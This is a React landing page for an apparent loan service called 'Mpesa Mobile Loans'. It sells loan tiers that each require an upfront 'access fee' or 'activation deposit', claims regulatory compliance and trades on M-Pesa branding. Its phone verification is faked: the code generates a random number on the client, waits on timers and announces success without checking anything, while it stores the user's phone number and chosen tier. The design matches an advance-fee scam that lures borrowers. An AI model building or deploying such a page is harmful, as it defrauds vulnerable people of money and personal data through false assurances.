import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { FaCheckCircle } from 'react-icons/fa';
import logo from './assets/logo.jpg';

const loanPackages = [
  { name: 'Basic', amount: 3000, fee: 99 },
  { name: 'Starter', amount: 5000, fee: 150 },
  { name: 'Lite', amount: 8000, fee: 200, badge: 'Popular', badgeColor: 'bg-blue-500' },
  { name: 'Standard', amount: 10000, fee: 250 },
  { name: 'Bronze', amount: 15000, fee: 275 },
  { name: 'Silver', amount: 20000, fee: 300 },
  { name: 'Gold', amount: 25000, fee: 375, badge: 'Best Value', badgeColor: 'bg-orange-500' },
  { name: 'Platinum', amount: 30000, fee: 450 },
  { name: 'Pro', amount: 40000, fee: 600 },
  { name: 'Elite', amount: 50000, fee: 750 },
  { name: 'Ultra', amount: 60000, fee: 900 },
  { name: 'Ultimate', amount: 80000, fee: 1200, badge: 'VIP', badgeColor: 'bg-red-500' },
];

function Home() {
  const navigate = useNavigate();

  const [isLoading, setIsLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [selectedPackage, setSelectedPackage] = useState(null);
  const [phone, setPhone] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [isVerified, setIsVerified] = useState(false);

  const scrollToPackages = () => {
    const section = document.getElementById('packages');
    if (section) {
      section.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  };

  const handleUnlock = (pkg) => {
    setIsLoading(true);
    setSelectedPackage(pkg);

    setTimeout(() => {
      setIsLoading(false);
      setShowModal(true);
      setPhone('');
      setIsVerifying(false);
      setVerificationCode('');
      setIsVerified(false);
    }, 2000);
  };

  const handleVerifyPhone = () => {
    if (!phone || phone.length < 10) return;

    setIsVerifying(true);

    setTimeout(() => {
      const randomCode = Math.floor(10000 + Math.random() * 90000).toString();
      setVerificationCode(randomCode);
      setPhone(randomCode);
      setIsVerifying(false);

      setTimeout(() => {
        setIsVerified(true);
        localStorage.setItem('userPhone', phone);
        localStorage.setItem('selectedLoan', JSON.stringify(selectedPackage));
      }, 4000);
    }, 2000);
  };

  const handleApplyNow = () => {
    navigate('/application');
  };

  const closeModal = () => {
    setShowModal(false);
    setSelectedPackage(null);
    setPhone('');
    setIsVerifying(false);
    setVerificationCode('');
    setIsVerified(false);
  };

  return (
    <div className="min-h-screen bg-gray-50 font-sans flex justify-center">
      <div className="w-full max-w-md bg-white min-h-screen shadow-xl relative">
        
        {/* Navbar */}
        <nav className="bg-white border-b border-gray-100 sticky top-0 z-50 px-4 h-14 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <img 
              src={logo} 
              alt="Mpesa Mobile Loans" 
              className="w-8 h-8 object-contain rounded-lg"
            />
            <span className="font-bold text-base text-dark-900">Mpesa Mobile Loans</span>
          </div>
          <button
            onClick={scrollToPackages}
            className="bg-mpesa-500 active:bg-mpesa-600 text-white text-sm font-semibold px-4 py-2 rounded-full"
          >
            Apply Now
          </button>
        </nav>

        {/* Hero Section */}
        <section className="bg-gradient-to-b from-mpesa-50 to-white px-5 pt-8 pb-10">
          <div className="text-center">
            <div className="inline-flex items-center gap-2 bg-mpesa-100 text-mpesa-700 text-xs font-medium px-3 py-1.5 rounded-full mb-5">
              <span className="w-1.5 h-1.5 bg-mpesa-500 rounded-full animate-pulse"></span>
              Instant Disbursement
            </div>

            <h1 className="text-3xl font-extrabold text-dark-900 leading-tight mb-3">
              Emergency funds in <span className="text-mpesa-500">60 seconds</span>
            </h1>

            <p className="text-sm text-gray-600 mb-7 leading-relaxed px-2">
              Access flexible mobile loans directly to your M-Pesa. No paperwork, no queues.
            </p>

            <button
              onClick={scrollToPackages}
              className="w-full bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold text-base py-3.5 rounded-xl shadow-lg shadow-mpesa-500/25"
            >
              Apply for Loan Now
            </button>
          </div>
        </section>

        {/* Loan Packages */}
        <section id="packages" className="px-4 py-8">
          <div className="text-center mb-6">
            <h2 className="text-xl font-bold text-dark-900 mb-1">Loan Packages</h2>
            <p className="text-sm text-gray-500">Select a limit to get started</p>
            <p className="text-xs text-mpesa-600 font-medium mt-1">12 Tiers Available</p>
          </div>

          <div className="space-y-4">
            {loanPackages.map((pkg) => (
              <div
                key={pkg.name}
                className="relative bg-white rounded-2xl border border-gray-100 p-5 shadow-sm"
              >
                {pkg.badge && (
                  <span className={`absolute -top-2.5 left-4 ${pkg.badgeColor} text-white text-[11px] font-semibold px-2.5 py-0.5 rounded-full`}>
                    {pkg.badge}
                  </span>
                )}

                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-xs font-medium text-gray-500 mb-0.5">{pkg.name}</p>
                    <p className="text-xl font-bold text-dark-900">
                      KSh {pkg.amount.toLocaleString()}
                    </p>
                  </div>

                  <div className="text-right">
                    <p className="text-[11px] text-gray-500">Access Fee</p>
                    <p className="text-sm font-semibold text-dark-900">
                      KSh {pkg.fee.toLocaleString()}
                    </p>
                  </div>
                </div>

                <button
                  onClick={() => handleUnlock(pkg)}
                  className="w-full mt-4 bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold py-3 rounded-xl text-sm"
                >
                  Unlock
                </button>
              </div>
            ))}
          </div>
        </section>

        {/* Why Trust Us */}
        <section className="px-4 py-8 bg-gray-50">
          <h2 className="text-xl font-bold text-dark-900 text-center mb-6">Why trust us?</h2>

          <div className="space-y-4">
            <div className="flex gap-3 p-4 rounded-2xl bg-white border border-gray-100">
              <div className="w-11 h-11 bg-mpesa-500 rounded-xl flex items-center justify-center flex-shrink-0">
                <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
              </div>
              <div>
                <h3 className="font-bold text-dark-900 text-sm mb-0.5">Regulated & Safe</h3>
                <p className="text-gray-600 text-xs leading-relaxed">Fully compliant with Kenyan digital lending regulations.</p>
              </div>
            </div>

            <div className="flex gap-3 p-4 rounded-2xl bg-white border border-gray-100">
              <div className="w-11 h-11 bg-mpesa-500 rounded-xl flex items-center justify-center flex-shrink-0">
                <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                </svg>
              </div>
              <div>
                <h3 className="font-bold text-dark-900 text-sm mb-0.5">Instant Withdrawal</h3>
                <p className="text-gray-600 text-xs leading-relaxed">Money hits your M-Pesa immediately after approval.</p>
              </div>
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer className="bg-dark-900 text-white px-5 pt-8 pb-6">
          <div className="text-center mb-6">
            <h3 className="text-lg font-bold mb-3">Mpesa Mobile Loans</h3>
            <div className="space-y-1 text-gray-300 text-sm">
              <p>Support: 0700 000 000</p>
              <p>Email: help@mpesamobileloans.co.ke</p>
              <p>Westlands, Nairobi, Kenya</p>
            </div>
          </div>

          <div className="border-t border-gray-700 pt-5">
            <p className="text-[11px] text-gray-400 text-center leading-relaxed">
              Disclaimer: Loans are subject to credit assessment and terms & conditions.
              The access fee is a one-time activation deposit required to unlock your chosen loan tier.
              This service is not affiliated with Safaricom PLC but operates on the M-Pesa ecosystem.
            </p>
            <p className="text-[11px] text-gray-500 text-center mt-3">
              © 2026 Mpesa Mobile Loans Kenya. All rights reserved.
            </p>
          </div>
        </footer>

        {/* Full Page Loader */}
        {isLoading && (
          <div className="fixed inset-0 bg-black/40 z-50 flex items-center justify-center">
            <div className="bg-white rounded-2xl p-8 flex flex-col items-center">
              <div className="w-10 h-10 border-4 border-mpesa-500 border-t-transparent rounded-full animate-spin"></div>
              <p className="mt-4 text-sm font-medium text-gray-700">Processing...</p>
            </div>
          </div>
        )}

        {/* Modal */}
        {showModal && (
          <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center px-4">
            <div className="bg-white w-full max-w-sm p-6" style={{ borderRadius: '2px' }}>
              
              {!isVerified ? (
                <>
                  <div className="flex items-center justify-between mb-5">
                    <div>
                      <h3 className="font-bold text-dark-900 text-lg">Verify Phone</h3>
                      {selectedPackage && (
                        <p className="text-xs text-gray-500 mt-0.5">
                          Unlocking {selectedPackage.name} • KSh {selectedPackage.amount.toLocaleString()}
                        </p>
                      )}
                    </div>
                    <button
                      onClick={closeModal}
                      className="text-gray-400 hover:text-gray-600 text-xl leading-none"
                    >
                      ×
                    </button>
                  </div>

                  <div className="mb-4">
                    <label className="block text-xs font-medium text-gray-600 mb-1.5">
                      {verificationCode ? 'Verification Code' : 'Phone Number'}
                    </label>
                    <input
                      type="text"
                      value={phone}
                      onChange={(e) => !verificationCode && setPhone(e.target.value)}
                      placeholder={verificationCode ? '' : '07XX XXX XXX'}
                      readOnly={!!verificationCode}
                      className="w-full border border-gray-200 px-4 py-3 text-sm focus:outline-none focus:border-mpesa-500"
                      style={{ borderRadius: '2px' }}
                    />
                  </div>

                  <button
                    onClick={handleVerifyPhone}
                    disabled={isVerifying || !!verificationCode}
                    className={`w-full py-3.5 text-sm font-semibold transition ${
                      verificationCode
                        ? 'bg-gray-100 text-green-600 cursor-default'
                        : 'bg-mpesa-500 active:bg-mpesa-600 text-white'
                    }`}
                    style={{ borderRadius: '2px' }}
                  >
                    {isVerifying ? (
                      <span className="flex items-center justify-center gap-2">
                        <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></span>
                        Verifying...
                      </span>
                    ) : verificationCode ? (
                      <span className="text-green-600 font-semibold">verifying code...</span>
                    ) : (
                      'Verify Phone Number'
                    )}
                  </button>
                </>
              ) : (
                /* SUCCESS STATE - Logo + Checkmark */
                <div className="text-center py-4">
                  <div className="flex items-center justify-center gap-3 mb-4">
                    <img 
                      src={logo} 
                      alt="Logo" 
                      className="w-12 h-12 object-contain rounded-lg"
                    />
                    <FaCheckCircle className="text-mpesa-500 text-5xl" />
                  </div>

                  <h3 className="font-bold text-dark-900 text-lg mb-1">Verification Completed</h3>
                  <p className="text-sm text-gray-500 mb-6">
                    Your phone number has been verified successfully.
                  </p>

                  <button
                    onClick={handleApplyNow}
                    className="w-full bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold py-3.5 text-sm"
                    style={{ borderRadius: '2px' }}
                  >
                    Apply Now
                  </button>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default Home;